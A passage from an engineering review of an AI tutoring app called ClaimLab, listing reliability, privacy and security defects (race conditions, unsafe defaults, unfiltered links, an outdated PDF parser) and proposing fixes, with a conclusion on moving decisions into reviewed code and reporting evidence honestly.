- **Deleting data during a turn leaks rows.** If "Delete my data" runs while a turn is in progress, the turn's final update raises `StaleDataError`, and any rows the turn committed after the purge survive. That is a privacy defect.

None of these paths has a test. The only cancel test accepts either "cancelled" or "succeeded" as the outcome ([test_complete_spec.py](../backend/tests/test_complete_spec.py)).

For a hackathon, the simplest fix has two parts:

- **Runner.** An in-process `ThreadPoolExecutor`, started in a lifespan hook, with its own `SessionLocal()` per job and a `progress()` callback that writes JobEvents.
- **Event stream.** The SSE generator opens a short-lived session for each poll, sends a keep-alive comment about every 15 s, and honours `Last-Event-ID`.

The guest cookie is same-origin, and the CSRF check covers only mutating routes, so a plain `EventSource` works without custom headers ([security.py](../backend/src/claimlab/security.py)). Background turns also remove two ceilings that synchronous turns will hit once deployed: nginx's default 60 s `proxy_read_timeout` between reads, and Starlette's default thread pool of 40 workers shared by every synchronous route ([nginx](https://nginx.org/en/docs/http/ngx_http_proxy_module.html); [Starlette thread pool](https://www.starlette.io/threadpool)).

The tool loop fails hard where it should degrade gracefully ([agent_orchestrator.py](../backend/src/claimlab/services/agent_orchestrator.py)):

- Any provider exception, including a 429, a 502 or a read timeout, fails the turn at once with no retry.
- `choices[0]` is parsed outside the guarded block.
- A `finish_reason` of `length`, meaning a truncated reply, goes undetected.
- A failure on the first turn deletes the session and its experiment runs, against the orchestration spec's instruction to "retain already committed valid checkpoints" ([orchestration spec](../docs/08_AGENT_ORCHESTRATION.md)).
- The dispatcher runs any known tool name, even one it did not offer, such as an experiment after the deadline or on a feedback turn.
- A repeated provider call id would hit `UniqueConstraint(job_id, provider_call_id)` and fail the turn, although the spec asks for deduplication.
- A non-JSON reply from TinyFish aborts the turn, because only `WebResearchError` is caught ([web_research.py](../backend/src/claimlab/services/web_research.py)).
- On the board, one invalid command silently drops its whole chunk of up to 20 commands ([lesson_builder.py](../backend/src/claimlab/services/lesson_builder.py)).

Security and privacy gaps also exist outside the sandbox:

- **Unsafe defaults.** `APP_ENV` defaults to development, which brings a fixed `SESSION_SECRET`, no Origin check and a cookie without the Secure flag, and nothing refuses to start in that state ([config.py](../backend/src/claimlab/config.py)).
- **Unfiltered links.** Tutor Markdown turns any `[text](https://…)` into a clickable link, so injected text can appear as a link the tutor endorses ([Markdown.tsx](../frontend/src/components/Markdown.tsx)).
- **No spending limits.** The `goal` and event `payload` fields have no size limit and flow into paid prompts. Any event that is not an answer triggers a live turn, and guest creation is unlimited. Meanwhile the budget is a hard-coded $0.01 reservation, and `APP_AI_BUDGET_USD` is never read ([session contracts](../backend/src/claimlab/contracts/session.py)).
- **Risky PDF parsing.** PDFs are parsed inside the API process with pypdf 5.1.0, with no `%PDF-` signature check, and the page limit is applied only after the whole file has loaded. CVE-2025-55197 lets a crafted file exhaust memory just by being read; it is fixed in pypdf 6.0.0 ([Chainguard](https://images.chainguard.dev/security/CVE-2025-55197); [pdf_service.py](../backend/src/claimlab/services/pdf_service.py)).
- **No retention sweep.** Nothing deletes expired guests, and idempotency records that hold private quotes never expire ([status and handoff](../docs/25_STATUS_AND_HANDOFF.md)).

Maintainability and front-end problems are real but can wait. `agent_orchestrator.py` (1,311 lines) and `api.py` (1,192 lines) each mix six to eight concerns. About 120 lines are exact duplicates: the seeded attention diagram and the turn-finalisation code. The legacy `present_teaching_step` path, about 85 lines, is never offered to the model but would still execute if called ([agent_orchestrator.py](../backend/src/claimlab/services/agent_orchestrator.py)). The front-end bundle is fine: 290 KB of main JavaScript, with 261 KB of KaTeX loaded lazily.

One cosmetic issue does matter for the video. **66 CSS rules set text at 8–10 px**, and below 1080 px wide the tutor text stacks under the board ([index.css](../frontend/src/index.css)). Two smaller front-end issues are also worth noting. The browser's `request()` has no timeout or `AbortController`. And because every call generates a fresh idempotency key, a manual retry can never be recognised as a duplicate ([App.tsx](../frontend/src/App.tsx)).

## Conclusion

The five questions share one answer. Every improvement with strong evidence behind it moves a decision out of the model's sequential loop, which re-reasons from scratch each round, and into reviewed code or an explicit object. Examples include code-graded check variants, a list of the tools each turn may run, a lesson schema whose first field is the direct answer, a job whose events report real progress, and a sandbox whose boundary is the operating system rather than a list of forbidden names. This is ClaimLab's founding principle, "the agent selects supported tools; reviewed code performs calculations", applied more consistently, and it pays off three times. Turns get faster, behaviour varies less from one turn to the next, and the demo gains a verifiable-agent story that sets it apart from Socratic chat modes and opaque generated charts.

The second lesson is about evidence. Every latency saving in this report is a hypothesis built on single observations, and no competitor publishes the accuracy of its grounding or grading. ClaimLab's first instrumented run, recording reasoning tokens, cached tokens and wall time for each round, is its best engineering tool. A small, honest table of quote-match rate, experiment success and grading agreement is its most distinctive submission artefact. A judge who sees ClaimLab report its own misses has a reason to believe its hits.
